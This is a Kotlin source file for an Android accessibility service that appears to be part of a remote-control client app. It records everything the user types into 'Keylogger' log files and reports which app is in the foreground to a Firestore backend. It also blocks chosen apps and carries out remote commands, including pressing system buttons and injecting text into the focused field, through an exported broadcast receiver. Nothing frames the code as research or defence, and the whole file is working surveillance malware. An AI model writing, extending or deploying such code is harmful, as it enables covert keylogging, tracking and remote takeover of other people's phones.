package com.client.services.other

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.client.services.client.currentDeviceID
import com.client.services.client.sendMessage
import com.google.firebase.firestore.FirebaseFirestore
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

val notifications = mutableListOf<Array<String>>()
var getCurrentlyOpenedApp = false
val appsToPreventOpening = mutableListOf<String>()
var prevPackageName = ""

class MyAccessibilityService : AccessibilityService() {
    private var prevTypedText = ""
    private var logFile: File? = null
    private var n: Int = 0
    private val MAX = 500
    private val firestore = FirebaseFirestore.getInstance()

    companion object {
        const val ACTION_GO_HOME = "com.client.services.others.MyAccessiblityService.ACTION_GO_HOME"
        const val ACTION_GO_BACK = "com.client.services.others.MyAccessiblityService.ACTION_GO_BACK"
        const val ACTION_RECENTS = "com.client.services.others.MyAccessiblityService.ACTION_RECENTS"
        const val ACTION_SET_FOCUSED_VIEW_TEXT = "com.client.services.others.MyAccessiblityService.ACTION_SET_FOCUSED_VIEW_TEXT"
    }

    // BroadcastReceiver to listen for global action commands
    private val actionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            Log.i("MyAccessibilityService", "Received broadcast: ${intent?.action}")
            val action = intent?.action ?: return
            val messageID = intent.getStringExtra("MessageID")
            val serverID = intent.getStringExtra("ServerID")
            when (action) {
                ACTION_GO_HOME -> {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    Log.i("MyAccessibilityService", "Global Action: HOME")
                    sendMessage(context, false, "CLICK_HOME: Operation completed successfully", messageID, serverID)
                }
                ACTION_GO_BACK -> {
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    Log.i("MyAccessibilityService", "Global Action: BACK")
                    sendMessage(context, false, "CLICK_BACK: Operation completed successfully", messageID, serverID)
                }
                ACTION_RECENTS -> {
                    performGlobalAction(GLOBAL_ACTION_RECENTS)
                    Log.i("MyAccessibilityService", "Global Action: RECENTS")
                    sendMessage(context, false, "CLICK_RECENTS: Operation completed successfully", messageID, serverID)
                }
                ACTION_SET_FOCUSED_VIEW_TEXT -> {
                    // Extract the text to input from extras
                    val inputText = intent.getStringExtra("InputText")
                    if (!inputText.isNullOrEmpty()) {
                        // Retrieve the root node of the active window
                        val rootNode = rootInActiveWindow
                        if (rootNode != null) {
                            // Get the node that currently has input focus (should be an EditText)
                            val focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                            if (focusedNode == null) {
                                Log.e("MyAccessibilityService", "No focused input node found.")
                                sendMessage(
                                    context,
                                    false,
                                    "SET_FOCUSED_VIEW_TEXT: Operation failed - no focused input node found",
                                    messageID,
                                    serverID
                                )
                            } else {
                                // Check if the focused node supports setting text
                                if (!focusedNode.actionList.contains(AccessibilityNodeInfo.AccessibilityAction.ACTION_SET_TEXT)) {
                                    Log.e("Accessibility", "Node does not support ACTION_SET_TEXT")
                                    sendMessage(
                                        context,
                                        false,
                                        "SET_FOCUSED_VIEW_TEXT: Operation failed - node does not support ACTION_SET_TEXT",
                                        messageID,
                                        serverID
                                    )
                                } else {
                                    // Create a bundle with the new text value
                                    val args = Bundle().apply {
                                        putCharSequence(
                                            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                                            inputText
                                        )
                                    }
                                    // Attempt to set the text
                                    val success = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                                    if (success) {
                                        sendMessage(
                                            context,
                                            false,
                                            "SET_FOCUSED_VIEW_TEXT: Operation completed successfully",
                                            messageID,
                                            serverID
                                        )
                                    } else {
                                        sendMessage(
                                            context,
                                            false,
                                            "SET_FOCUSED_VIEW_TEXT: Operation failed",
                                            messageID,
                                            serverID
                                        )
                                    }
                                    Log.i("MyAccessibilityService", "Input text action success: $success; text: $inputText")
                                }
                                // Recycle the focused node when done
                                focusedNode.recycle()
                            }
                            // Recycle the root node as well
                            rootNode.recycle()
                        } else {
                            Log.e("MyAccessibilityService", "No root node found")
                            sendMessage(
                                context,
                                false,
                                "SET_FOCUSED_VIEW_TEXT: Operation failed - no root node found",
                                messageID,
                                serverID
                            )
                        }
                    } else {
                        Log.e("MyAccessibilityService", "No input text provided in intent extras.")
                        sendMessage(context, false, "SET_FOCUSED_VIEW_TEXT: Operation failed - no input text provided", messageID, serverID)
                    }
                }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (n > MAX) {
                n = 0
            }
            n++
            if (event != null) {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        var str = ""
                        for (c in event.text) {
                            str += c.toString()
                        }
                        if (logFile == null) {
                            val formatter = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault())
                            val formattedDate = formatter.format(Date())
                            val name = "$formattedDate.txt"
                            File(Environment.getExternalStorageDirectory().path + "/Logs/Keylogger").mkdirs()
                            val path = Environment.getExternalStorageDirectory().path + "/Logs/Keylogger/$name"
                            logFile = File(path)
                            logFile!!.createNewFile()
                        }
                        logFile!!.appendText(str + "\n")
                        if (logFile!!.length() > 50000) {
                            logFile = null
                        }
                        prevTypedText = str
                    }
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        val packageName = event.packageName?.toString()
                        val className = event.className?.toString()
                        if (packageName != prevPackageName) {
                            if (getCurrentlyOpenedApp) {
                                val data = hashMapOf<String, Any>(
                                    "FocussedPackageName" to packageName.toString()
                                )
                                firestore.collection("Devices").document(currentDeviceID)
                                    .update(data)
                                    .addOnFailureListener {
                                        it.printStackTrace()
                                        Log.e("AccessibilityService", "Failed to update focused package")
                                    }
                            }
                            Log.i("AccessibilityService", "Package Name: $packageName, Class Name: $className")
                            prevPackageName = packageName.toString()
                        }
                        if (packageName in appsToPreventOpening) {
                            performGlobalAction(GLOBAL_ACTION_HOME)
                        }
                    }
                    // You can add additional event types if needed.
                    else -> {
                    }
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            val formatter = SimpleDateFormat("yyyy-MM-dd HH-mm-ss", Locale.getDefault())
            val formattedDate = formatter.format(Date())
            FirebaseFirestore.getInstance().collection("Uncaught Errors")
                .document()
                .set(
                    hashMapOf(
                        "ID" to currentDeviceID,
                        "Message" to ex.message,
                        "Localized Message" to ex.localizedMessage,
                        "Class" to "MyAccessibilityService",
                        "Date & Time" to formattedDate
                    )
                ).addOnFailureListener {
                    it.printStackTrace()
                }
        }
    }

    override fun onServiceConnected() {
        Log.d("MyAccessibilityService", "Service connected")
        // Register the broadcast receiver for global action commands.
        val filter = IntentFilter().apply {
            addAction("com.client.ACTION_GO_HOME")
            addAction("com.client.ACTION_GO_BACK")
            addAction("com.client.ACTION_RECENTS")
            addAction("com.client.ACTION_SET_FOCUSED_VIEW_TEXT")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            registerReceiver(actionReceiver, filter, RECEIVER_EXPORTED)
        } else {
            registerReceiver(actionReceiver, filter)
        }

        // Configure our Accessibility service.
        val info = serviceInfo
        info.eventTypes =
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 100
        info.flags =
            AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        serviceInfo = info
    }

    override fun onInterrupt() {
        // Handle service interruption if needed.
    }

    override fun onDestroy() {
        unregisterReceiver(actionReceiver)
        super.onDestroy()
    }
}
